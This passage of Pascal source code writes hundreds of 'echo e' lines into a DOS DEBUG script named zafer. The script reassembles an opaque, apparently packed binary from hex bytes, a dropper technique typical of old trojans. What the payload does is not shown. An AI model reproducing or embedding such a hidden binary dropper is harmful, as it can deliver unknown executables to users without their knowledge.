   writeln(qup,'echo e 1F70  7F EB 11 58 E8 70 00 B6 76 38 9B DF 9C 97 FC FE>>zafer');
   writeln(qup,'echo e 1F80  C6 6E DC E3 5A 21 AD 14 BD 70 D4 BB 04 E3 B4 65>>zafer');
   writeln(qup,'echo e 1F90  E0 58 5F 52 E9 2A 02 3C 83 0D 25 70 74 E7 0E 84>>zafer');
   writeln(qup,'echo e 1FA0  17 A7 D8 3C EA 0A 75 07 B7 E1 68 FD F7 8B C3 E8>>zafer');
   writeln(qup,'echo e 1FB0  63 04 01 F8 6B 72 3C 6D 18 23 12 D7 DA 76 75 0D>>zafer');
   writeln(qup,'echo e 1FC0  C9 B5 03 11 A0 AB D6 B5 56 E0 47 FD 0D E7 DA 07>>zafer');
   writeln(qup,'echo e 1FD0  A0 10 B7 5B 24 F8 DA 40 A2 07 0D 44 62 B9 8D CC>>zafer');
   writeln(qup,'echo e 1FE0  FD 3A 36 59 02 73 04 AB 05 0F 52 E6 83 D7 60 AF>>zafer');
   writeln(qup,'echo e 1FF0  5F 0D CF E1 E9 66 85 E3 E7 46 19 DE FF C5 B7 1F>>zafer');
   writeln(qup,'echo e 2000  F6 C6 12 8E DA F2 94 DE 5F 1F E0 75 DE A2 86 ED>>zafer');
   writeln(qup,'echo e 2010  C3 E8 A0 C2 5B 33 09 19 55 2D 2B 72 57 BF 37 09>>zafer');
   writeln(qup,'echo e 2020  75 1D 75 14 19 BB 0D 16 8A 47 99 58 F2 0B 80 3E>>zafer');
   writeln(qup,'echo e 2030  D1 FF B7 A7 8A 5F 40 C3 5C 0D 0D C4 AA 3A D1 EE>>zafer');
   writeln(qup,'echo e 2040  6A 44 B5 21 6A 51 15 7B 8D 0B 0B EC 17 11 F0 42>>zafer');
   writeln(qup,'echo e 2050  C3 8A 50 58 E7 90 19 DC B6 05 57 78 ED CC C3 06>>zafer');
   writeln(qup,'echo e 2060  77 94 E8 67 FC D1 CB 00 70 F9 6F 64 29 04 EB 03>>zafer');
   writeln(qup,'echo e 2070  70 66 9B 18 01 CB B4 E9 03 4A DC 86 A2 06 87 D0>>zafer');
   writeln(qup,'echo e 2080  61 6A E1 34 1F 04 C1 9D D5 BA 83 EC 08 18 66 00>>zafer');
   writeln(qup,'echo e 2090  B1 8E FA 28 15 94 31 1B E0 76 0A 1C AD 78 44 B6>>zafer');
   writeln(qup,'echo e 20A0  8F 2B 51 8B ED 5A 6A 26 00 C5 EB 53 BE BB D7 81>>zafer');
   writeln(qup,'echo e 20B0  FB 64 17 A9 4C 53 4B 9F F8 C2 E8 D4 24 EE F3 5B>>zafer');
   writeln(qup,'echo e 20C0  52 C0 41 51 5B 30 53 17 B5 38 2D 2E 81 04 5B DC>>zafer');
   writeln(qup,'echo e 20D0  C6 46 07 B5 09 1D 65 44 6F 10 06 FA 59 0B 11 04>>zafer');
   writeln(qup,'echo e 20E0  73 09 41 5D 0F 04 13 4F 6E 89 4F 2D B5 DE 8E BB>>zafer');
   writeln(qup,'echo e 20F0  29 89 5C 97 6E 46 6E BA 2B 11 BB D6 57 2B B6 27>>zafer');
   writeln(qup,'echo e 2100  FE 0D C9 C4 05 5B D0 BC 04 D7 76 2B 6C B6 BD 01>>zafer');
   writeln(qup,'echo e 2110  DE 1D EB 20 53 E4 64 6B 1E 67 76 8B 5D 91 A3 B3>>zafer');
   writeln(qup,'echo e 2120  6B D3 88 42 BA 8B DB 7F 5E F7 D8 E8 79 05 6D 4B>>zafer');
   writeln(qup,'echo e 2130  29 B0 17 07 57 E0 E0 C3 B3 DD EE B3 03 B2 02 04>>zafer');
   writeln(qup,'echo e 2140  CB 05 06 2C 07 B2 09 CB 0A 0B 2C 0D B2 0E CB 10>>zafer');
   writeln(qup,'echo e 2150  13 2C 18 B2 19 CB 1B 28 2C 32 B2 34 CB 35 36 2C>>zafer');
   writeln(qup,'echo e 2160  37 B2 38 CB 39 3A 2C 3B B2 3D CB 3E 3F 2C 40 B2>>zafer');
   writeln(qup,'echo e 2170  43 CB 44 45 2C 46 B2 47 CB 48 49 2C 4A B2 4B CB>>zafer');
   writeln(qup,'echo e 2180  4C 50 FF EB 31 BB 00 90 EB 2E BB B6 07 04 29 DE>>zafer');
   writeln(qup,'echo e 2190  09 94 EB 24 B7 E2 98 EB ED 1F BB 03 04 E5 1A BB>>zafer');
   writeln(qup,'echo e 21A0  04 16 11 E6 72 FF D0 EB D6 F6 3F 61 0A 35 BF 6C>>zafer');
   writeln(qup,'echo e 21B0  A7 FC 58 02 30 20 6E 3D 92 03 34 36 68 E5 2B FA>>zafer');
   writeln(qup,'echo e 21C0  90 BB 77 1E 7A E7 7A CD 3B 0E 3A 18 09 9F 9B DD>>zafer');
   writeln(qup,'echo e 21D0  EB D2 0E EB ED F4 D9 E3 F3 6B 1B 14 1E F4 53 53>>zafer');
   writeln(qup,'echo e 21E0  34 6F 2D 7F AC B2 02 A9 FA 6A E2 9A 10 B9 3A B6>>zafer');
   writeln(qup,'echo e 21F0  40 3A 04 C6 5B 3A F1 7B 06 98 6B FC 54 C2 A5 DB>>zafer');
   writeln(qup,'echo e 2200  0F 13 3B 2A 17 F9 F8 A0 6A 06 36 6B 38 2C E7 46>>zafer');
   writeln(qup,'echo e 2210  D9 80 EB 59 54 64 78 E8 F9 F6 57 46 67 05 62 FE>>zafer');
   writeln(qup,'echo e 2220  00 9A 73 07 93 E8 1D DF 28 5F F7 53 B8 C0 FF 9A>>zafer');
   writeln(qup,'echo e 2230  C0 85 2E 43 6D 09 00 1C 03 DD CD 00 53 0B F4 A2>>zafer');
   writeln(qup,'echo e 2240  E0 03 CB 56 24 FD F0 3A DC 42 E9 DA 06 1C DA 09>>zafer');
   writeln(qup,'echo e 2250  30 36 4A F0 85 A1 96 DA 0A 35 01 2C C5 33 BA F2>>zafer');
   writeln(qup,'echo e 2260  5E 64 DC DA 52 28 00 1A 8D 23 91 C9 E2 E8 25 DD>>zafer');
   writeln(qup,'echo e 2270  99 66 3E 93 D0 E8 CC 01 1D EA 58 FF 24 0F 04 90>>zafer');
   writeln(qup,'echo e 2280  27 14 40 27 56 DB C1 D0 FE 1F 5A C3 BB 0A A3 7F>>zafer');
   writeln(qup,'echo e 2290  41 0D E0 F3 EE 80 C2 30 60 D2 F4 8B 27 EE D1 58>>zafer');
   writeln(qup,'echo e 22A0  08 12 3D BF 91 81 FF FD CB B1 0B EB 0B B1 52 D0>>zafer');
   writeln(qup,'echo e 22B0  A3 91 86 F3 FC B1 05 58 5A 9D 2A 3A 15 A5 2F E6>>zafer');
   writeln(qup,'echo e 22C0  8A D9 E9 DD B8 FE FC 2D EA 01 0C C7 EF A3 00 10>>zafer');
   writeln(qup,'echo e 22D0  CB EA A8 F4 DB 85 06 11 10 6E F4 24 04 01 E9 7F>>zafer');
   writeln(qup,'echo e 22E0  B4 4A E8 FE 03 73 BB E7 06 F7 03 F6 72 E0 8C C1>>zafer');
   writeln(qup,'echo e 22F0  CD A1 3F 68 40 EE EF A3 44 07 38 74 2E 6C 42 07>>zafer');
   writeln(qup,'echo e 2300  3A 94 8C 37 BE A1 9E 82 03 61 D7 C2 E9 25 57 B5>>zafer');
   writeln(qup,'echo e 2310  50 F6 0A FC 97 22 8D 08 2C B8 1B 78 50 51 E1 D6>>zafer');
   writeln(qup,'echo e 2320  17 50 AE 77 0C ED E8 BF FC FD F8 F7 E8 94 E4 07>>zafer');
   writeln(qup,'echo e 2330  66 41 24 EB 2B 1E F4 7B 43 43 53 2B 66 10 77 B3>>zafer');
   writeln(qup,'echo e 2340  05 EA E5 77 81 A3 4E 01 A9 93 DC 56 45 FB 03 5F>>zafer');
   writeln(qup,'echo e 2350  FE 89 24 B6 05 81 11 A9 6D 57 9A 5A 57 32 D6 19>>zafer');
   writeln(qup,'echo e 2360  18 F0 2B DE 79 6D BB 3E BD CC 8B 45 EE 46 4F F5>>zafer');
   writeln(qup,'echo e 2370  45 F8 05 2F 90 2B F8 2B 94 3E 4B 8B 79 4B 7D DB>>zafer');
   writeln(qup,'echo e 2380  52 C3 ED 29 1E 0B AD 5F AA EE CB 53 06 A8 00 6F>>zafer');
   writeln(qup,'echo e 2390  E5 7E E3 B8 B0 78 86 7E A1 4C 00 40 40 A9 B5 5C>>zafer');
   writeln(qup,'echo e 23A0  72 AB 00 B8 C4 1E 4A DD E5 64 25 2A E3 35 55 6C>>zafer');
   writeln(qup,'echo e 23B0  B2 56 45 BE A4 26 3B 77 0E 05 32 74 05 10 5B 35>>zafer');
   writeln(qup,'echo e 23C0  26 EC 2B 77 18 0B 78 1A 72 01 29 23 7B 91 B8 8B>>zafer');
   writeln(qup,'echo e 23D0  28 6B 00 1B 5B 53 3B A5 F1 D3 FB 3B F3 77 01 48>>zafer');
   writeln(qup,'echo e 23E0  93 55 28 F5 8B 24 82 A4 AA 71 C0 7A AE D0 07 C0>>zafer');
   writeln(qup,'echo e 23F0  C0 85 DE F0 16 BE 3E 07 D1 DA 73 2A 3C DD 8E 81>>zafer');
   writeln(qup,'echo e 2400  FE 35 8B F2 56 38 D0 73 6A A5 61 6D 3C BA 05 6F>>zafer');
   writeln(qup,'echo e 2410  27 83 D2 00 F6 D1 EA D1 D8 03 06 B6 79 55 37 3B>>zafer');
   writeln(qup,'echo e 2420  8B 7C 5F 3C 8B A5 4D B3 FF 4D 06 2B CA F7 D9 2B>>zafer');
   writeln(qup,'echo e 2430  D0 13 6B 6B 12 89 13 54 FA 49 7F 04 65 F9 1B C2>>zafer');
   writeln(qup,'echo e 2440  A5 C7 00 F8 1A 43 56 56 57 8B 16 2D 1C 01 6B A6>>zafer');
   writeln(qup,'echo e 2450  E0 6D 5E 12 75 76 39 A0 20 56 09 76 48 B6 DF C3>>zafer');
   writeln(qup,'echo e 2460  16 E7 FC 07 D8 6E 9A B8 8A 8D 0F DC 4B 00 22 FA>>zafer');
   writeln(qup,'echo e 2470  5F 5C EB 53 06 5B B1 DA 74 BA 78 57 00 C7 79 75>>zafer');
   writeln(qup,'echo e 2480  22 BA 89 18 C6 E6 3B 43 A1 84 6C 1F 40 76 D7 83>>zafer');
   writeln(qup,'echo e 2490  8E B6 18 13 35 B1 A0 B8 C6 00 92 BF AA 6C F5 56>>zafer');
   writeln(qup,'echo e 24A0  14 D2 D4 8B DB FC EE 97 85 BE D5 80 83 B9 EA B1>>zafer');
   writeln(qup,'echo e 24B0  36 3B 02 1E 85 0B B4 FF 30 6B 41 39 60 58 D8 7A>>zafer');
   writeln(qup,'echo e 24C0  E8 0D 58 56 60 C5 3B D6 5A 75 A1 DA 16 05 DF 69>>zafer');
   writeln(qup,'echo e 24D0  73 05 FD 03 F1 D8 03 D0 B9 A2 6B C3 3D 72 13 D6>>zafer');
   writeln(qup,'echo e 24E0  C2 E1 D5 D1 A2 80 D6 F4 0B C2 72 C3 FD D9 03 D1>>zafer');
   writeln(qup,'echo e 24F0  D1 E1 FB 01 33 F6 2F D5 BD D0 4E D1 E6 6B D9 0A>>zafer');
   writeln(qup,'echo e 2500  46 1B FC 89 34 47 47 49 5A 9F 38 26 68 44 05 B7>>zafer');
   writeln(qup,'echo e 2510  88 53 D1 3F BA 8A F7 D3 BA A9 02 0E 88 C3 25 01>>zafer');
   writeln(qup,'echo e 2520  C2 04 80 DA 57 95 84 2C A4 46 2B 18 8C 56 DF DB>>zafer');
   writeln(qup,'echo e 2530  8C 6F 06 D7 6A 04 F5 C0 72 6A 7A 8D C1 86 D0 C0>>zafer');
   writeln(qup,'echo e 2540  6E F2 14 A1 D0 3B 2B 0C A1 56 38 DC C2 06 14 D7>>zafer');
   writeln(qup,'echo e 2550  0B F1 00 02 10 84 9A 10 CD D4 25 10 37 C5 B1 0C>>zafer');
   writeln(qup,'echo e 2560  D3 C0 EA C3 DB 7E 2B 06 E3 6E 2B 45 68 CD D8 5C>>zafer');
   writeln(qup,'echo e 2570  56 66 3D F4 84 5D D7 27 34 ED 34 FF F1 0F 93 72>>zafer');
   writeln(qup,'echo e 2580  EC FE 5B EB F1 5E 20 DC B1 8B F7 36 C6 0B FF 17>>zafer');
   writeln(qup,'echo e 2590  5B 3B FB FE 72 F3 3B FA 73 EF 01 17 A3 EB EA 7E>>zafer');
   writeln(qup,'echo e 25A0  1F 8B 36 97 35 3C 56 66 3E 13 75 B6 0A 1B 02 ED>>zafer');
   writeln(qup,'echo e 25B0  51 EB EB 78 06 6D 5E 03 C2 B4 82 F4 AD F9 4E 00>>zafer');
   writeln(qup,'echo e 25C0  8A 07 16 27 08 37 50 78 08 07 84 54 E8 BB B0 EB>>zafer');
   writeln(qup,'echo e 25D0  0D A7 47 38 46 F7 01 89 61 AD 0E E6 A1 0F E9 15>>zafer');
   writeln(qup,'echo e 25E0  B1 D3 FD 74 7B 03 77 C1 C3 51 A1 8A 4B 78 63 8C>>zafer');
   writeln(qup,'echo e 25F0  5A 49 C1 D7 48 E5 5A D0 E2 C3 CC 85 59 21 4E D8>>zafer');
   writeln(qup,'echo e 2600  1D 38 2B 7A 07 42 8B A6 D8 8D 1E 95 BA 07 06 17>>zafer');
   writeln(qup,'echo e 2610  25 48 DC 10 03 13 15 4A AD E9 1D BA 89 21 5B 33>>zafer');
   writeln(qup,'echo e 2620  D4 5B 64 73 E2 06 3D 08 2D 39 5B 50 3D 75 AB 05>>zafer');
   writeln(qup,'echo e 2630  62 24 25 AD B6 FA 73 31 B7 FE 2B 29 04 70 FE 25>>zafer');
   writeln(qup,'echo e 2640  6D 1F B1 9A DA 77 19 0D 02 47 42 89 2E D5 5B 06>>zafer');
   writeln(qup,'echo e 2650  F8 74 06 FF 6E 83 04 05 30 35 D4 6D 5C 6E D0 2B>>zafer');
   writeln(qup,'echo e 2660  51 4E A6 37 AA A3 4C 1B 82 37 D2 89 36 7D FE 50>>zafer');
   writeln(qup,'echo e 2670  0B C6 58 74 2F 09 6C 60 8E 0D EA 1A C8 95 6F B2>>zafer');
   writeln(qup,'echo e 2680  05 45 E1 17 26 75 74 2E 09 2E B6 06 A9 97 70 74>>zafer');
   writeln(qup,'echo e 2690  C6 B7 A9 DF 74 C1 89 A9 8C AD BC 33 77 3B EB CB>>zafer');
   writeln(qup,'echo e 26A0  59 13 B7 45 58 6C D9 13 12 B0 AD 09 5C 13 0D 6B>>zafer');
   writeln(qup,'echo e 26B0  E9 80 FE AB D8 43 6A 7B F9 CB E8 43 99 62 3A DA>>zafer');
   writeln(qup,'echo e 26C0  51 3E 5B 6F C7 02 6D C4 05 F2 4F 00 E8 BE E2 BB>>zafer');
   writeln(qup,'echo e 26D0  F2 3C 68 0B 8C 06 7E AE C4 34 FD 7B 8C 06 AD 85>>zafer');
   writeln(qup,'echo e 26E0  A4 75 48 E8 AF 9F 07 A1 10 6E 5B 04 FE C4 07 5E>>zafer');
   writeln(qup,'echo e 26F0  BB E6 7E F9 27 51 A2 55 AD B0 89 79 FA 6D 82 3C>>zafer');
   writeln(qup,'echo e 2700  52 E1 8E 74 FD EA E8 41 E6 72 E5 B0 1D C3 62 33>>zafer');
   writeln(qup,'echo e 2710  86 94 7D 2D EB 5C 8B BD 44 BB AF 7F 18 03 7D 4F>>zafer');
   writeln(qup,'echo e 2720  0E 2B CF 4A 9F 16 01 8E 89 F0 54 A2 4A A5 93 FF>>zafer');
   writeln(qup,'echo e 2730  AB 89 3E 90 06 8C 1E 59 5A F7 2D 33 05 3A 9C 2D>>zafer');
   writeln(qup,'echo e 2740  DE 6B 16 BC D1 B6 E8 14 38 1C 0E D1 10 52 C3 A9>>zafer');
   writeln(qup,'echo e 2750  7C BE AB BF 6C 06 B9 15 90 1B EE 8B B4 DC 65 53>>zafer');
   writeln(qup,'echo e 2760  17 53 AF 75 35 71 F1 41 CB 9D 0B A3 A8 09 C1 76>>zafer');
   writeln(qup,'echo e 2770  00 34 A2 06 10 A3 68 E0 71 8C D1 28 F4 85 53 04>>zafer');
   writeln(qup,'echo e 2780  2A 8A 05 44 87 AB 12 1A 01 05 E0 47 6A E6 A0 01>>zafer');
   writeln(qup,'echo e 2790  67 26 58 C6 2B C7 D4 F8 83 EA 28 57 0B CD 5E 84>>zafer');
   writeln(qup,'echo e 27A0  DD 6B 97 5F B0 9D 16 CD AF 0F 80 12 97 BA 1A 89>>zafer');
   writeln(qup,'echo e 27B0  DA 45 06 02 A5 93 A9 C4 FB 58 60 0C 08 D7 8B 25>>zafer');
   writeln(qup,'echo e 27C0  E2 45 1A 2D 76 72 1E DE 94 E3 25 F7 D6 86 20 A3>>zafer');
   writeln(qup,'echo e 27D0  72 B7 EC 03 09 4B 01 12 14 AA 52 DE 3B 51 E8 C0>>zafer');
   writeln(qup,'echo e 27E0  DA 79 5D 58 63 1D 58 F1 89 16 9F 05 F4 46 02 97>>zafer');
   writeln(qup,'echo e 27F0  B6 CC 3D D6 6B 4C 28 14 D2 54 BD 31 D8 77 34 96>>zafer');
   writeln(qup,'echo e 2800  55 ED 35 E8 9A BD 50 2C C7 07 A0 81 AE 28 FC 18>>zafer');
   writeln(qup,'echo e 2810  5B 53 03 DF 50 11 BD D1 80 E1 FE FA 1B 9D 01 1F>>zafer');
   writeln(qup,'echo e 2820  23 0A 89 12 63 D9 5B 4E AD 77 46 43 DB F4 47 BB>>zafer');
   writeln(qup,'echo e 2830  6C 55 EB 12 68 BB 59 33 DB 00 62 AD B5 DE 83 5D>>zafer');
   writeln(qup,'echo e 2840  4D 2C 0A 82 08 6B 13 34 56 AE 41 4D FB 3B 4C FE>>zafer');
   writeln(qup,'echo e 2850  74 30 5D D2 76 B4 6A 28 7A 29 66 5A 5F 25 69 DD>>zafer');
   writeln(qup,'echo e 2860  3D 01 5E 4E 75 27 89 2F 7B 12 83 EE 1C A9 16 22>>zafer');
   writeln(qup,'echo e 2870  A8 39 56 68 96 83 9E 63 A2 56 7C C4 83 C4 04 02>>zafer');
   writeln(qup,'echo e 2880  0A 61 8E 60 0A DA 2E 53 5F 7A 03 D6 42 42 F0 3B>>zafer');
   writeln(qup,'echo e 2890  17 74 1B 2E 81 8B 17 05 B0 FA 73 13 42 D1 E2 5F>>zafer');
   writeln(qup,'echo e 28A0  60 72 0C 92 E8 B4 73 AB 4C 0A 37 9B EB 75 A6 5B>>zafer');
   writeln(qup,'echo e 28B0  AF E8 F7 45 1C 6A C7 07 DF 8D E8 83 07 74 56 86>>zafer');
   writeln(qup,'echo e 28C0  85 CE ED 36 80 7F BE FB 5B 9C 74 08 FF 63 7B F2>>zafer');
   writeln(qup,'echo e 28D0  C7 04 84 52 E8 EF 41 41 83 B4 B9 15 68 D5 16 31>>zafer');
   writeln(qup,'echo e 28E0  FE EB 89 2C 35 3E 09 48 48 09 5E 71 4B 07 BB CF>>zafer');
   writeln(qup,'echo e 28F0  59 9D 8B 5C DC 96 2A 0C D6 20 9C C0 F8 33 9D 8D>>zafer');
   writeln(qup,'echo e 2900  5A 40 17 0F E9 63 F7 FF 58 5B 50 3E 37 27 36 03>>zafer');
   writeln(qup,'echo e 2910  8A 59 3A 40 E9 2D 6B 63 EF 03 DF 74 FE E2 59 ED>>zafer');
   writeln(qup,'echo e 2920  51 E3 0C 14 FA 8B 75 1E E8 3F B7 0C 07 EB 86 E1>>zafer');
   writeln(qup,'echo e 2930  AD F0 81 04 E9 E2 06 01 C2 3D 37 84 32 10 97 87>>zafer');
   writeln(qup,'echo e 2940  59 1D 22 0B E2 DB 74 28 DB D0 14 7E 6D 22 8E 7E>>zafer');
   writeln(qup,'echo e 2950  41 74 11 E6 94 6B C1 3B AA 12 DB 01 89 04 43 A2>>zafer');
   writeln(qup,'echo e 2960  FE E3 07 83 4D 1C 10 2E 86 04 65 83 C2 49 06 ED>>zafer');
   writeln(qup,'echo e 2970  8B 77 25 C6 F2 74 2C C2 04 3A CF 74 0F F0 49 E8>>zafer');
   writeln(qup,'echo e 2980  66 00 D5 0B 8D B1 D4 5E 47 AE 08 37 09 75 E2 14>>zafer');
   writeln(qup,'echo e 2990  B6 8E 89 27 ED E8 21 0A 81 D7 A4 5C F8 0A 58 72>>zafer');
   writeln(qup,'echo e 29A0  7C A5 DE 77 F5 DB 3B DF DB 74 BA 73 53 6E 10 94>>zafer');
   writeln(qup,'echo e 29B0  06 5C EB AF 36 C9 3C 40 17 D7 03 F0 DD 72 1E 56>>zafer');
   writeln(qup,'echo e 29C0  18 2C 40 35 92 EE D0 9E 03 2C E1 3D 0B 67 39 EA>>zafer');
   writeln(qup,'echo e 29D0  0F 72 E4 5D 3B 0B E4 6E 9D E9 6A 2D 1E C3 0C 56>>zafer');
   writeln(qup,'echo e 29E0  19 6E 03 F1 46 C2 03 48 C4 C0 96 62 E0 30 B8 30>>zafer');
   writeln(qup,'echo e 29F0  C3 FF 4F 31 B7 BC 1A 9B 6D 1C 89 06 1A A4 16 27>>zafer');
   writeln(qup,'echo e 2A00  D3 0D 65 DB 83 E9 91 0F 1B F7 08 AD 8D 51 60 CF>>zafer');
   writeln(qup,'echo e 2A10  85 DD 1C 74 25 D2 CF F9 01 EB 81 BB 7E C0 77 2A>>zafer');
   writeln(qup,'echo e 2A20  4D 18 E3 F4 23 8B 7D 16 B8 A0 E3 1C 54 81 FF 3A>>zafer');
   writeln(qup,'echo e 2A30  F2 AF 8B DF 75 A5 10 3D C5 5D 16 4C F0 0D 20 B1>>zafer');
   writeln(qup,'echo e 2A40  CB E6 FE 5F 39 4D 14 75 20 B9 95 F9 3B 7A DE 78>>zafer');
   writeln(qup,'echo e 2A50  9A D9 04 D4 30 D3 7B 04 AB 1A AE D8 54 ED D7 EB>>zafer');
   writeln(qup,'echo e 2A60  B1 7C B8 18 37 34 E8 04 BE 26 BA 40 00 22 D5 D8>>zafer');
   writeln(qup,'echo e 2A70  BF 5F 95 05 75 0B 2B 8D F2 4E 85 83 A0 F4 75 F0>>zafer');
   writeln(qup,'echo e 2A80  EB 2F 68 AA 95 F5 B5 D9 36 AB A8 D9 7E 01 14 EB>>zafer');
   writeln(qup,'echo e 2A90  4B B9 D8 25 51 46 30 60 E1 98 6F 57 59 B9 02 60>>zafer');
   writeln(qup,'echo e 2AA0  0F CE 50 14 33 2E 2B E9 79 15 FC BF 7A E8 54 05>>zafer');
   writeln(qup,'echo e 2AB0  59 73 85 F2 2F EA 48 74 ED EF 04 01 91 8D 5D 14>>zafer');
   writeln(qup,'echo e 2AC0  AD 02 CE B6 58 FA D8 FD A7 17 83 A1 A4 04 60 20>>zafer');
   writeln(qup,'echo e 2AD0  DF 5B 3B 45 22 72 0A D2 D6 04 02 F9 20 01 55 08>>zafer');
   writeln(qup,'echo e 2AE0  76 18 53 94 F0 14 01 57 6B BE DB 44 1B 59 8B AC>>zafer');
   writeln(qup,'echo e 2AF0  CA B9 FE 5F E9 04 FF C7 A3 6C 6D 3B AD 1C 00 D0>>zafer');
   writeln(qup,'echo e 2B00  04 74 B7 75 2E 8C CE 2B D6 E4 1F FC 8B D1 57 8D>>zafer');
   writeln(qup,'echo e 2B10  7C 70 4B 8B 95 BD AF FC 5F 41 A2 00 5D 5D 76 43>>zafer');
   writeln(qup,'echo e 2B20  2B 09 5E 7B 18 2B C2 56 76 18 2D DC FB 39 45 16>>zafer');
   writeln(qup,'echo e 2B30  76 64 AE 16 5A 96 29 29 D7 67 A0 36 05 20 CE F8>>zafer');
   writeln(qup,'echo e 2B40  12 35 D0 B4 EE 36 3E CD 29 17 17 88 E8 96 4B 36>>zafer');
   writeln(qup,'echo e 2B50  04 77 5C 4A 89 14 08 BF 84 BE 86 51 2D 0A 5F 5D>>zafer');
   writeln(qup,'echo e 2B60  9A C1 19 03 5A 6E 1A 44 40 30 B8 6D 58 5D B9 14>>zafer');
   writeln(qup,'echo e 2B70  60 3D 1E F8 66 CE E7 79 D3 36 02 1E C6 DC 02 B7>>zafer');
   writeln(qup,'echo e 2B80  95 87 4D F8 1A 83 F9 02 72 B5 9A 2E B6 C1 49 19>>zafer');
   writeln(qup,'echo e 2B90  EC 6E 9D 89 05 B3 E0 68 84 98 E8 40 E2 A4 61 46>>zafer');
   writeln(qup,'echo e 2BA0  F5 3D C2 D8 5C 1C FF 04 CB FE 89 66 FE 83 7D 0E>>zafer');
   writeln(qup,'echo e 2BB0  6F AE 0D F1 8D 03 30 E1 C7 46 FC 07 76 EB 48 A2>>zafer');
   writeln(qup,'echo e 2BC0  C7 14 0B 6E 2B CE FF A6 1C 2D 95 0D 33 25 7C 78>>zafer');
   writeln(qup,'echo e 2BD0  C6 87 47 D8 87 04 EC 86 E2 E8 30 71 35 68 B4 4E>>zafer');
   writeln(qup,'echo e 2BE0  F6 AD C2 6A 6F 84 5D 02 4E C1 89 37 5B FE A9 4B>>zafer');
   writeln(qup,'echo e 2BF0  0C 76 E0 FC 29 35 51 BC 6E 43 C6 76 14 6B 5B C7>>zafer');
   writeln(qup,'echo e 2C00  46 C0 F8 1E 97 9E 1F 2E F8 03 37 25 72 2D FF 89>>zafer');
   writeln(qup,'echo e 2C10  5E FA 83 FB F0 77 25 1A 11 08 50 7F 1A A0 E0 0C>>zafer');
   writeln(qup,'echo e 2C20  BA 41 BB F0 95 4B 1A B3 0D A0 D6 4A 00 6A BD 08>>zafer');
   writeln(qup,'echo e 2C30  B0 2C FA 68 D9 99 B0 B3 92 FE 21 BD 5A 4A DB 4D>>zafer');
   writeln(qup,'echo e 2C40  FC AB 11 0B 98 FC B6 01 AB EB 97 8E 4E FC F7 8B>>zafer');
   writeln(qup,'echo e 2C50  1D E3 08 EF 54 41 D7 AD 0D F4 22 36 54 4A D6 39>>zafer');
   writeln(qup,'echo e 2C60  31 80 67 E5 E7 36 7B 53 E5 7C 35 01 59 D4 7E 5B>>zafer');
   writeln(qup,'echo e 2C70  2C 3E 9C 18 21 71 9D B1 CA 77 C9 27 A7 85 C1 BF>>zafer');
   writeln(qup,'echo e 2C80  56 53 7D 36 F3 1C AD EA 4B 7D 2C 81 8D F6 61 87>>zafer');
   writeln(qup,'echo e 2C90  3E 7F 0C 3B F7 74 2B A1 0B 94 97 58 DD 2B A5 A2>>zafer');
   writeln(qup,'echo e 2CA0  A5 5C 9E 19 97 2D 10 41 6A 98 5E 99 2B DF 4B 05>>zafer');
   writeln(qup,'echo e 2CB0  F8 FE EB C9 43 03 F3 73 C4 04 2E 52 78 A6 9A DB>>zafer');
   writeln(qup,'echo e 2CC0  72 F4 4B EB E1 B4 2B F7 08 41 A0 FF FD 1E F3 74>>zafer');
   writeln(qup,'echo e 2CD0  6B EF 99 62 57 DB 08 D6 17 74 03 F9 A1 3B 4F 5A>>zafer');
   writeln(qup,'echo e 2CE0  39 99 8A AD 28 0C 73 47 75 62 FD 8D E7 C0 59 5F>>zafer');
   writeln(qup,'echo e 2CF0  A1 64 6D D7 51 7E 75 1A 3B C2 72 16 AD 8F 02 1A>>zafer');
   writeln(qup,'echo e 2D00  72 0D C6 56 87 C2 F0 CD B6 79 2B B4 5C 32 73 DE>>zafer');
   writeln(qup,'echo e 2D10  9E 18 75 D8 20 D1 F6 CD 6B 5B 72 F2 4A FF D2 30>>zafer');
   writeln(qup,'echo e 2D20  B4 79 70 45 6E 94 2B E3 21 DD 5E F7 47 68 C1 5E>>zafer');
   writeln(qup,'echo e 2D30  2C 3E 8B 57 16 C8 D6 96 70 3B 8D 14 B4 15 86 53>>zafer');
   writeln(qup,'echo e 2D40  10 05 CA 13 AC 75 7F 16 96 82 0A 98 07 7C 4C 16>>zafer');
   writeln(qup,'echo e 2D50  1F 85 F8 8E FB 20 B4 E7 40 0E 4F 35 71 BC 4F EB>>zafer');
   writeln(qup,'echo e 2D60  AE 8B 72 FB 58 03 4A E6 F0 39 FC 03 FA 72 CB 3B>>zafer');
   writeln(qup,'echo e 2D70  4B FC 73 D3 CD FD 0A 70 74 B2 83 2A DB 2B 3B 6C>>zafer');
   writeln(qup,'echo e 2D80  E7 86 A4 28 70 D9 3B 16 C0 A2 B0 24 C2 24 6C EB>>zafer');
   writeln(qup,'echo e 2D90  0A 96 07 C2 AB C1 D4 A9 C6 3E 91 A0 0F 45 6D A0>>zafer');
   writeln(qup,'echo e 2DA0  F5 C1 81 E9 E3 1A 56 E9 63 87 79 E4 09 71 03 FF>>zafer');
   writeln(qup,'echo e 2DB0  BF 77 46 46 E2 EB 5B 52 BC D9 FC F6 BC 44 03 70>>zafer');
   writeln(qup,'echo e 2DC0  3B B4 9A A8 11 23 81 15 73 78 46 9A 13 8D B1 F4>>zafer');
   writeln(qup,'echo e 2DD0  3D 03 7D FE 74 E5 58 02 5D B0 7F 17 33 AF 68 13>>zafer');
   writeln(qup,'echo e 2DE0  29 61 46 08 91 BD F8 3B 44 FE D6 33 73 F6 D2 3C>>zafer');
   writeln(qup,'echo e 2DF0  10 C5 14 2A BE 3A 60 0B 03 A5 AD 2D 26 B3 C4 37>>zafer');
   writeln(qup,'echo e 2E00  62 62 E7 32 66 CC FC CD 7C E2 BA 54 80 33 16 24>>zafer');
   writeln(qup,'echo e 2E10  3D 16 07 74 2B CC 6D 30 72 2E E9 F1 2B 16 E6 E7>>zafer');
   writeln(qup,'echo e 2E20  0F BB 14 DF 5F 8B C7 4E 4E 4F DF 4F FD 0E FC 6D>>zafer');
   writeln(qup,'echo e 2E30  15 59 B6 96 F3 11 A5 16 D2 8B DD DC 83 06 77 73>>zafer');
   writeln(qup,'echo e 2E40  0A 0D 75 1F 01 04 0B 2F F0 0A 46 34 DF 1A B3 B0>>zafer');
   writeln(qup,'echo e 2E50  0E E4 0C 37 A3 45 4E DE A6 26 89 4D 24 17 A0 1C>>zafer');
   writeln(qup,'echo e 2E60  25 FC FC FF E3 03 0B 46 5A 20 D4 0A E8 D4 DA A4>>zafer');
   writeln(qup,'echo e 2E70  51 1C 60 51 A0 94 56 AE 6A C4 C6 A0 3F 58 A8 97>>zafer');
